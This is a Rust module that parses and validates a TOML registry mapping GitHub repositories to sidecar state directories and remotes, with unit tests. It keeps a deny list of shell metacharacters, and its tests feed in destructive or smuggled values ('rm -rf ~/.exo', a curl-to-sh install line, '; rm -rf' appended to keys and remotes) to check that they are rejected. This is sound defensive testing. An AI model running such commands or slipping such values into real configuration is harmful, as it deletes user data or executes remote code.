use crate::github::remote::{ParsedGithubRemote, parse_github_remote};
use serde::Deserialize;
use std::collections::BTreeMap;
use std::path::Path;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum SidecarRegistryMatchKind {
    ExactProject,
    OwnerTemplate,
    Defaults,
    None,
    Error,
}

impl SidecarRegistryMatchKind {
    pub(crate) const fn as_str(self) -> &'static str {
        match self {
            Self::ExactProject => "exact-project",
            Self::OwnerTemplate => "owner-template",
            Self::Defaults => "defaults",
            Self::None => "none",
            Self::Error => "error",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum SidecarDiscoveryConfidence {
    High,
    Medium,
    Low,
    None,
}

impl SidecarDiscoveryConfidence {
    pub(crate) const fn as_str(self) -> &'static str {
        match self {
            Self::High => "high",
            Self::Medium => "medium",
            Self::Low => "low",
            Self::None => "none",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum SidecarRegistryFailureClassification {
    RegistryParseError,
    UnsafeRegistryValue,
    NoMatchingEntry,
}

impl SidecarRegistryFailureClassification {
    pub(crate) const fn as_str(self) -> &'static str {
        match self {
            Self::RegistryParseError => "registry-parse-error",
            Self::UnsafeRegistryValue => "unsafe-registry-value",
            Self::NoMatchingEntry => "no-matching-entry",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct SidecarRegistryProposal {
    pub(crate) key: String,
    pub(crate) root: Option<String>,
    pub(crate) remote: Option<String>,
    pub(crate) auto_push: Option<String>,
    pub(crate) would_mutate_config: bool,
    pub(crate) requires_remote_acceptance: bool,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct SidecarRegistryFailure {
    pub(crate) classification: SidecarRegistryFailureClassification,
    pub(crate) message: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct SidecarRegistryResolution {
    pub(crate) ok: bool,
    pub(crate) match_kind: SidecarRegistryMatchKind,
    pub(crate) confidence: SidecarDiscoveryConfidence,
    pub(crate) proposal: Option<SidecarRegistryProposal>,
    pub(crate) failure: Option<SidecarRegistryFailure>,
}

pub(crate) fn resolve_sidecar_registry(
    registry_toml: &str,
    repository: &ParsedGithubRemote,
) -> SidecarRegistryResolution {
    let raw_document = match toml::from_str::<toml::Value>(registry_toml) {
        Ok(document) => document,
        Err(error) => {
            return failure_resolution(
                SidecarRegistryFailureClassification::RegistryParseError,
                format!("Failed to parse sidecar registry TOML: {error}"),
            );
        }
    };

    if let Err(failure) = validate_registry_shape(&raw_document) {
        return failure.into_resolution();
    }

    let document = match toml::from_str::<RegistryDocument>(registry_toml) {
        Ok(document) => document,
        Err(error) => {
            return failure_resolution(
                SidecarRegistryFailureClassification::RegistryParseError,
                format!("Failed to parse sidecar registry TOML: {error}"),
            );
        }
    };

    if document.version != 1 {
        return failure_resolution(
            SidecarRegistryFailureClassification::RegistryParseError,
            format!(
                "Unsupported sidecar registry version {}; expected version 1",
                document.version
            ),
        );
    }

    if let Err(failure) = validate_document_safety(&document) {
        return failure.into_resolution();
    }

    if let Some(project) = find_case_insensitive(&document.projects, &repository.project_key) {
        return match project_proposal(project, &document.defaults, repository) {
            Ok(proposal) => success_resolution(
                SidecarRegistryMatchKind::ExactProject,
                SidecarDiscoveryConfidence::High,
                proposal,
            ),
            Err(failure) => failure.into_resolution(),
        };
    }

    if let Some(owner) = find_case_insensitive(&document.owners, &repository.owner)
        && owner.has_proposal_fields()
    {
        return match owner_proposal(owner, &document.defaults, repository) {
            Ok(proposal) => success_resolution(
                SidecarRegistryMatchKind::OwnerTemplate,
                SidecarDiscoveryConfidence::Medium,
                proposal,
            ),
            Err(failure) => failure.into_resolution(),
        };
    }

    if document.defaults.has_proposal_fields() {
        return match defaults_proposal(&document.defaults, repository) {
            Ok(proposal) => success_resolution(
                SidecarRegistryMatchKind::Defaults,
                SidecarDiscoveryConfidence::Low,
                proposal,
            ),
            Err(failure) => failure.into_resolution(),
        };
    }

    no_matching_entry_resolution()
}

#[derive(Debug, Deserialize)]
struct RegistryDocument {
    version: i64,
    #[serde(default)]
    defaults: RegistryDefaults,
    #[serde(default)]
    projects: BTreeMap<String, RegistryProject>,
    #[serde(default)]
    owners: BTreeMap<String, RegistryOwner>,
}

#[derive(Debug, Default, Deserialize)]
struct RegistryDefaults {
    root: Option<String>,
    remote_template: Option<String>,
    auto_push: Option<String>,
}

impl RegistryDefaults {
    const fn has_proposal_fields(&self) -> bool {
        self.root.is_some() || self.remote_template.is_some() || self.auto_push.is_some()
    }
}

#[derive(Debug, Default, Deserialize)]
struct RegistryProject {
    key: Option<String>,
    root: Option<String>,
    remote: Option<String>,
    auto_push: Option<String>,
}

#[derive(Debug, Default, Deserialize)]
struct RegistryOwner {
    root: Option<String>,
    remote_template: Option<String>,
    auto_push: Option<String>,
}

impl RegistryOwner {
    const fn has_proposal_fields(&self) -> bool {
        self.root.is_some() || self.remote_template.is_some() || self.auto_push.is_some()
    }
}

impl SidecarRegistryFailure {
    const fn into_resolution(self) -> SidecarRegistryResolution {
        SidecarRegistryResolution {
            ok: false,
            match_kind: SidecarRegistryMatchKind::Error,
            confidence: SidecarDiscoveryConfidence::None,
            proposal: None,
            failure: Some(self),
        }
    }
}

const fn success_resolution(
    match_kind: SidecarRegistryMatchKind,
    confidence: SidecarDiscoveryConfidence,
    proposal: SidecarRegistryProposal,
) -> SidecarRegistryResolution {
    SidecarRegistryResolution {
        ok: true,
        match_kind,
        confidence,
        proposal: Some(proposal),
        failure: None,
    }
}

const fn failure_resolution(
    classification: SidecarRegistryFailureClassification,
    message: String,
) -> SidecarRegistryResolution {
    SidecarRegistryResolution {
        ok: false,
        match_kind: SidecarRegistryMatchKind::Error,
        confidence: SidecarDiscoveryConfidence::None,
        proposal: None,
        failure: Some(SidecarRegistryFailure {
            classification,
            message,
        }),
    }
}

fn no_matching_entry_resolution() -> SidecarRegistryResolution {
    SidecarRegistryResolution {
        ok: false,
        match_kind: SidecarRegistryMatchKind::None,
        confidence: SidecarDiscoveryConfidence::None,
        proposal: None,
        failure: Some(SidecarRegistryFailure {
            classification: SidecarRegistryFailureClassification::NoMatchingEntry,
            message: "Registry did not produce a matching sidecar entry".to_string(),
        }),
    }
}

fn find_case_insensitive<'a, T>(map: &'a BTreeMap<String, T>, key: &str) -> Option<&'a T> {
    map.iter()
        .find(|(candidate, _)| candidate.eq_ignore_ascii_case(key))
        .map(|(_, value)| value)
}

fn validate_registry_shape(value: &toml::Value) -> Result<(), SidecarRegistryFailure> {
    validate_value_table_keys(
        value,
        &["version", "defaults", "projects", "owners"],
        "registry",
    )?;

    if let Some(defaults) = value.get("defaults") {
        validate_value_table_keys(
            defaults,
            &["root", "remote_template", "auto_push"],
            "defaults",
        )?;
    }

    if let Some(projects) = value.get("projects").and_then(toml::Value::as_table) {
        for (key, project) in projects {
            validate_registry_map_key("project", key)?;
            validate_value_table_keys(project, &["key", "root", "remote", "auto_push"], "project")?;
        }
    }

    if let Some(owners) = value.get("owners").and_then(toml::Value::as_table) {
        for (key, owner) in owners {
            validate_registry_map_key("owner", key)?;
            validate_value_table_keys(owner, &["root", "remote_template", "auto_push"], "owner")?;
        }
    }

    Ok(())
}

fn validate_value_table_keys(
    value: &toml::Value,
    allowed: &[&str],
    context: &str,
) -> Result<(), SidecarRegistryFailure> {
    let Some(table) = value.as_table() else {
        return Ok(());
    };

    for key in table.keys() {
        if !allowed.contains(&key.as_str()) {
            return Err(unsafe_registry_value(format!(
                "Unknown field {key:?} in sidecar registry {context}"
            )));
        }
    }

    Ok(())
}

fn validate_document_safety(document: &RegistryDocument) -> Result<(), SidecarRegistryFailure> {
    validate_defaults_safety(&document.defaults)?;

    for (key, project) in &document.projects {
        validate_registry_map_key("project", key)?;
        if let Some(key) = &project.key {
            validate_sidecar_key(key)?;
        }
        if let Some(root) = &project.root {
            validate_root(root)?;
        }
        if let Some(remote) = &project.remote {
            validate_remote(remote)?;
        }
        if let Some(auto_push) = &project.auto_push {
            normalize_auto_push(auto_push)?;
        }
    }

    for (key, owner) in &document.owners {
        validate_registry_map_key("owner", key)?;
        if let Some(root) = &owner.root {
            validate_root(root)?;
        }
        if let Some(remote_template) = &owner.remote_template {
            validate_remote_template(remote_template)?;
        }
        if let Some(auto_push) = &owner.auto_push {
            normalize_auto_push(auto_push)?;
        }
    }

    Ok(())
}

fn validate_defaults_safety(defaults: &RegistryDefaults) -> Result<(), SidecarRegistryFailure> {
    if let Some(root) = &defaults.root {
        validate_root(root)?;
    }
    if let Some(remote_template) = &defaults.remote_template {
        validate_remote_template(remote_template)?;
    }
    if let Some(auto_push) = &defaults.auto_push {
        normalize_auto_push(auto_push)?;
    }
    Ok(())
}

fn validate_registry_map_key(kind: &str, value: &str) -> Result<(), SidecarRegistryFailure> {
    validate_no_shell_fragments(value, kind)?;
    if value.trim() != value || value.is_empty() {
        return Err(unsafe_registry_value(format!(
            "Invalid sidecar registry {kind} key {value:?}"
        )));
    }
    Ok(())
}

fn validate_sidecar_key(value: &str) -> Result<(), SidecarRegistryFailure> {
    validate_no_shell_fragments(value, "sidecar key")?;
    if value.is_empty()
        || value == "."
        || value == ".."
        || value.starts_with('.')
        || !value
            .chars()
            .all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '-' | '_' | '.'))
    {
        return Err(unsafe_registry_value(format!(
            "Invalid sidecar key {value:?}; use letters, numbers, dots, underscores, or dashes"
        )));
    }
    Ok(())
}

fn validate_root(value: &str) -> Result<(), SidecarRegistryFailure> {
    validate_no_shell_fragments(value, "sidecar root")?;
    if value == "~" || value.starts_with("~/") || Path::new(value).is_absolute() {
        return Ok(());
    }
    Err(unsafe_registry_value(format!(
        "Invalid sidecar root {value:?}; use an absolute path or a ~/ path"
    )))
}

fn validate_remote_template(value: &str) -> Result<(), SidecarRegistryFailure> {
    validate_no_shell_fragments(value, "remote template")?;
    validate_template_variables(value)
}

fn validate_remote(value: &str) -> Result<(), SidecarRegistryFailure> {
    validate_no_shell_fragments(value, "remote")?;

    if !(value.starts_with("https://") || value.starts_with("git@")) {
        return Err(unsafe_registry_value(format!(
            "Unsupported sidecar remote {value:?}; use https://github.com/... or git@github.com:..."
        )));
    }

    parse_github_remote(value).map_err(|error| {
        unsafe_registry_value(format!(
            "Invalid sidecar remote {value:?}; expected a GitHub remote: {error}"
        ))
    })?;

    Ok(())
}

fn validate_no_shell_fragments(value: &str, context: &str) -> Result<(), SidecarRegistryFailure> {
    if value.trim() != value || value.chars().any(char::is_control) {
        return Err(unsafe_registry_value(format!(
            "Unsafe whitespace or control character in sidecar registry {context}: {value:?}"
        )));
    }

    for needle in [";", "&&", "||", "|", "$(", "`", "<", ">"] {
        if value.contains(needle) {
            return Err(unsafe_registry_value(format!(
                "Unsafe shell fragment {needle:?} in sidecar registry {context}: {value:?}"
            )));
        }
    }

    Ok(())
}

fn validate_template_variables(template: &str) -> Result<(), SidecarRegistryFailure> {
    let mut rest = template;

    while let Some(start) = rest.find('{') {
        let prefix = &rest[..start];
        if prefix.contains('}') {
            return Err(unsafe_registry_value(format!(
                "Malformed remote template {template:?}"
            )));
        }

        let after_open = &rest[start + 1..];
        let Some(end) = after_open.find('}') else {
            return Err(unsafe_registry_value(format!(
                "Malformed remote template {template:?}"
            )));
        };
        let variable = &after_open[..end];
        if !matches!(variable, "host" | "owner" | "repo" | "key") {
            return Err(unsafe_registry_value(format!(
                "Unknown remote template variable {{{variable}}}"
            )));
        }
        rest = &after_open[end + 1..];
    }

    if rest.contains('}') {
        return Err(unsafe_registry_value(format!(
            "Malformed remote template {template:?}"
        )));
    }

    Ok(())
}

fn project_proposal(
    project: &RegistryProject,
    defaults: &RegistryDefaults,
    repository: &ParsedGithubRemote,
) -> Result<SidecarRegistryProposal, SidecarRegistryFailure> {
    let key = project
        .key
        .clone()
        .unwrap_or_else(|| repository.repo.clone());
    validate_sidecar_key(&key)?;
    let root = project.root.clone().or_else(|| defaults.root.clone());
    let remote = match &project.remote {
        Some(remote) => Some(remote.clone()),
        None => expand_template_option(defaults.remote_template.as_deref(), repository, &key)?,
    };
    validate_remote_option(remote.as_deref())?;
    let auto_push = normalize_auto_push_option(
        project
            .auto_push
            .as_deref()
            .or(defaults.auto_push.as_deref()),
    )?;

    Ok(SidecarRegistryProposal {
        key,
        root,
        remote,
        auto_push,
        would_mutate_config: true,
        requires_remote_acceptance: false,
    })
}

fn owner_proposal(
    owner: &RegistryOwner,
    defaults: &RegistryDefaults,
    repository: &ParsedGithubRemote,
) -> Result<SidecarRegistryProposal, SidecarRegistryFailure> {
    let key = repository.repo.clone();
    validate_sidecar_key(&key)?;
    let root = owner.root.clone().or_else(|| defaults.root.clone());
    let remote = expand_template_option(
        owner
            .remote_template
            .as_deref()
            .or(defaults.remote_template.as_deref()),
        repository,
        &key,
    )?;
    validate_remote_option(remote.as_deref())?;
    let auto_push =
        normalize_auto_push_option(owner.auto_push.as_deref().or(defaults.auto_push.as_deref()))?;
    let requires_remote_acceptance = remote.is_some();

    Ok(SidecarRegistryProposal {
        key,
        root,
        remote,
        auto_push,
        would_mutate_config: true,
        requires_remote_acceptance,
    })
}

fn defaults_proposal(
    defaults: &RegistryDefaults,
    repository: &ParsedGithubRemote,
) -> Result<SidecarRegistryProposal, SidecarRegistryFailure> {
    let key = repository.repo.clone();
    validate_sidecar_key(&key)?;
    let root = defaults.root.clone();
    let remote = expand_template_option(defaults.remote_template.as_deref(), repository, &key)?;
    validate_remote_option(remote.as_deref())?;
    let auto_push = normalize_auto_push_option(defaults.auto_push.as_deref())?;
    let requires_remote_acceptance = remote.is_some();

    Ok(SidecarRegistryProposal {
        key,
        root,
        remote,
        auto_push,
        would_mutate_config: true,
        requires_remote_acceptance,
    })
}

fn normalize_auto_push_option(
    value: Option<&str>,
) -> Result<Option<String>, SidecarRegistryFailure> {
    value.map(normalize_auto_push).transpose()
}

fn normalize_auto_push(value: &str) -> Result<String, SidecarRegistryFailure> {
    match value {
        "never" | "if_remote" | "always" => Ok(value.to_string()),
        other => Err(unsafe_registry_value(format!(
            "Invalid auto_push value {other:?}; expected never, if_remote, or always"
        ))),
    }
}

fn validate_remote_option(value: Option<&str>) -> Result<(), SidecarRegistryFailure> {
    if let Some(value) = value {
        validate_remote(value)?;
    }
    Ok(())
}

fn expand_template_option(
    template: Option<&str>,
    repository: &ParsedGithubRemote,
    key: &str,
) -> Result<Option<String>, SidecarRegistryFailure> {
    template
        .map(|template| expand_template(template, repository, key))
        .transpose()
}

fn expand_template(
    template: &str,
    repository: &ParsedGithubRemote,
    key: &str,
) -> Result<String, SidecarRegistryFailure> {
    let mut output = String::new();
    let mut rest = template;

    while let Some(start) = rest.find('{') {
        let prefix = &rest[..start];
        if prefix.contains('}') {
            return Err(unsafe_registry_value(format!(
                "Malformed remote template {template:?}"
            )));
        }
        output.push_str(prefix);

        let after_open = &rest[start + 1..];
        let Some(end) = after_open.find('}') else {
            return Err(unsafe_registry_value(format!(
                "Malformed remote template {template:?}"
            )));
        };
        let variable = &after_open[..end];
        let value = match variable {
            "host" => &repository.host,
            "owner" => &repository.owner,
            "repo" => &repository.repo,
            "key" => key,
            other => {
                return Err(unsafe_registry_value(format!(
                    "Unknown remote template variable {{{other}}}"
                )));
            }
        };
        output.push_str(value);
        rest = &after_open[end + 1..];
    }

    if rest.contains('}') {
        return Err(unsafe_registry_value(format!(
            "Malformed remote template {template:?}"
        )));
    }
    output.push_str(rest);

    Ok(output)
}

const fn unsafe_registry_value(message: String) -> SidecarRegistryFailure {
    SidecarRegistryFailure {
        classification: SidecarRegistryFailureClassification::UnsafeRegistryValue,
        message,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::github::remote::parse_github_remote;

    fn repo() -> ParsedGithubRemote {
        parse_github_remote("git@github.com:wycats/locald.git").expect("remote parses")
    }

    fn proposal_for(registry: &str) -> SidecarRegistryProposal {
        let resolution = resolve_sidecar_registry(registry, &repo());
        assert!(resolution.ok, "expected ok resolution: {resolution:#?}");
        resolution.proposal.expect("expected proposal")
    }

    fn assert_unsafe_registry(registry: &str) {
        let resolution = resolve_sidecar_registry(registry, &repo());
        assert!(!resolution.ok, "expected unsafe registry: {resolution:#?}");
        assert_eq!(resolution.match_kind, SidecarRegistryMatchKind::Error);
        assert_eq!(resolution.confidence, SidecarDiscoveryConfidence::None);
        assert_eq!(
            resolution.failure.expect("expected failure").classification,
            SidecarRegistryFailureClassification::UnsafeRegistryValue,
        );
    }

    #[test]
    fn github_profile_registry_resolver_uses_exact_project_match_with_default_fallbacks() {
        let registry = r#"
version = 1

[defaults]
root = "~/.exo/sidecars"
auto_push = "if_remote"
remote_template = "git@github.com:{owner}/{repo}-default.git"

[projects."github.com/wycats/locald"]
key = "locald-state"
remote = "git@github.com:wycats/locald-exosuit-state.git"
"#;

        let resolution = resolve_sidecar_registry(registry, &repo());
        assert!(resolution.ok, "expected exact match: {resolution:#?}");
        assert_eq!(
            resolution.match_kind,
            SidecarRegistryMatchKind::ExactProject
        );
        assert_eq!(resolution.confidence, SidecarDiscoveryConfidence::High);

        let proposal = resolution.proposal.expect("expected proposal");
        assert_eq!(proposal.key, "locald-state");
        assert_eq!(proposal.root.as_deref(), Some("~/.exo/sidecars"));
        assert_eq!(
            proposal.remote.as_deref(),
            Some("git@github.com:wycats/locald-exosuit-state.git"),
        );
        assert_eq!(proposal.auto_push.as_deref(), Some("if_remote"));
        assert!(proposal.would_mutate_config);
        assert!(!proposal.requires_remote_acceptance);
    }

    #[test]
    fn github_profile_registry_resolver_matches_project_keys_case_insensitively() {
        let registry = r#"
version = 1

[projects."GITHUB.COM/WyCats/LocalD"]
key = "mixed-case-match"
remote = "git@github.com:wycats/locald-exosuit-state.git"
"#;

        let proposal = proposal_for(registry);
        assert_eq!(proposal.key, "mixed-case-match");
    }

    #[test]
    fn github_profile_registry_resolver_uses_owner_template_before_defaults() {
        let registry = r#"
version = 1

[defaults]
root = "~/.exo/sidecars"
remote_template = "git@github.com:{owner}/{repo}-default.git"
auto_push = "never"

[owners."wycats"]
remote_template = "git@github.com:wycats/{repo}-exo.git"
auto_push = "always"
"#;

        let resolution = resolve_sidecar_registry(registry, &repo());
        assert!(
            resolution.ok,
            "expected owner-template match: {resolution:#?}"
        );
        assert_eq!(
            resolution.match_kind,
            SidecarRegistryMatchKind::OwnerTemplate
        );
        assert_eq!(resolution.confidence, SidecarDiscoveryConfidence::Medium);

        let proposal = resolution.proposal.expect("expected proposal");
        assert_eq!(proposal.key, "locald");
        assert_eq!(proposal.root.as_deref(), Some("~/.exo/sidecars"));
        assert_eq!(
            proposal.remote.as_deref(),
            Some("git@github.com:wycats/locald-exo.git"),
        );
        assert_eq!(proposal.auto_push.as_deref(), Some("always"));
        assert!(proposal.requires_remote_acceptance);
    }

    #[test]
    fn github_profile_registry_resolver_uses_defaults_when_no_project_or_owner_match() {
        let registry = r#"
version = 1

[defaults]
root = "~/.exo/sidecars"
remote_template = "git@github.com:{owner}/{repo}-exosuit-state.git"
auto_push = "if_remote"
"#;

        let resolution = resolve_sidecar_registry(registry, &repo());
        assert!(resolution.ok, "expected defaults match: {resolution:#?}");
        assert_eq!(resolution.match_kind, SidecarRegistryMatchKind::Defaults);
        assert_eq!(resolution.confidence, SidecarDiscoveryConfidence::Low);

        let proposal = resolution.proposal.expect("expected proposal");
        assert_eq!(proposal.key, "locald");
        assert_eq!(proposal.root.as_deref(), Some("~/.exo/sidecars"));
        assert_eq!(
            proposal.remote.as_deref(),
            Some("git@github.com:wycats/locald-exosuit-state.git"),
        );
        assert_eq!(proposal.auto_push.as_deref(), Some("if_remote"));
        assert!(proposal.requires_remote_acceptance);
    }

    #[test]
    fn github_profile_registry_resolver_empty_owner_table_falls_through_to_defaults() {
        let registry = r#"
version = 1

[defaults]
root = "~/.exo/sidecars"
remote_template = "git@github.com:{owner}/{repo}-exosuit-state.git"
auto_push = "if_remote"

[owners."wycats"]
"#;

        let resolution = resolve_sidecar_registry(registry, &repo());
        assert!(resolution.ok, "expected defaults match: {resolution:#?}");
        assert_eq!(resolution.match_kind, SidecarRegistryMatchKind::Defaults);
        assert_eq!(resolution.confidence, SidecarDiscoveryConfidence::Low);

        let proposal = resolution.proposal.expect("expected proposal");
        assert_eq!(
            proposal.remote.as_deref(),
            Some("git@github.com:wycats/locald-exosuit-state.git"),
        );
    }

    #[test]
    fn github_profile_registry_resolver_reports_no_matching_entry_for_empty_registry() {
        let resolution = resolve_sidecar_registry("version = 1", &repo());

        assert!(!resolution.ok);
        assert_eq!(resolution.match_kind, SidecarRegistryMatchKind::None);
        assert_eq!(resolution.confidence, SidecarDiscoveryConfidence::None);
        assert_eq!(
            resolution.failure.expect("expected failure").classification,
            SidecarRegistryFailureClassification::NoMatchingEntry,
        );
    }

    #[test]
    fn github_profile_registry_resolver_reports_parse_error_for_bad_toml_or_version() {
        let bad_toml = resolve_sidecar_registry("version =", &repo());
        assert!(!bad_toml.ok);
        assert_eq!(
            bad_toml.failure.expect("expected failure").classification,
            SidecarRegistryFailureClassification::RegistryParseError,
        );

        let unsupported = resolve_sidecar_registry("version = 2", &repo());
        assert!(!unsupported.ok);
        assert_eq!(
            unsupported
                .failure
                .expect("expected failure")
                .classification,
            SidecarRegistryFailureClassification::RegistryParseError,
        );
    }

    #[test]
    fn github_profile_registry_safety_rejects_unknown_fields() {
        assert_unsafe_registry(
            r#"
version = 1

[defaults]
root = "~/.exo/sidecars"
command = "rm -rf ~/.exo"
"#,
        );

        assert_unsafe_registry(
            r#"
version = 1

[projects."github.com/wycats/locald"]
key = "locald"
script = "curl https://example.invalid/install.sh | sh"
"#,
        );
    }

    #[test]
    fn github_profile_registry_safety_rejects_unsafe_roots_and_keys() {
        assert_unsafe_registry(
            r#"
version = 1

[defaults]
root = "relative/path"
"#,
        );

        assert_unsafe_registry(
            r#"
version = 1

[projects."github.com/wycats/locald"]
key = "locald; rm -rf ~/.exo"
remote = "git@github.com:wycats/locald-exosuit-state.git"
"#,
        );
    }

    #[test]
    fn github_profile_registry_safety_rejects_unsafe_remote_values() {
        for remote in [
            "../state.git",
            "/tmp/state.git",
            "file:///tmp/state.git",
            "ssh://git@github.com/wycats/locald-exosuit-state.git",
            "https://gitlab.com/wycats/locald-exosuit-state.git",
            "git@gitlab.com:wycats/locald-exosuit-state.git",
            "git@github.com:wycats/locald-exosuit-state.git; rm -rf ~/.exo",
        ] {
            let registry = format!(
                r#"
version = 1

[projects."github.com/wycats/locald"]
key = "locald"
remote = {remote:?}
"#
            );

            assert_unsafe_registry(&registry);
        }
    }

    #[test]
    fn github_profile_registry_safety_rejects_unsafe_remote_templates() {
        assert_unsafe_registry(
            r#"
version = 1

[defaults]
remote_template = "https://gitlab.com/{owner}/{repo}.git"
"#,
        );

        assert_unsafe_registry(
            r#"
version = 1

[owners."wycats"]
remote_template = "git@github.com:{owner}/{repo}.git && rm -rf ~/.exo"
"#,
        );
    }
}
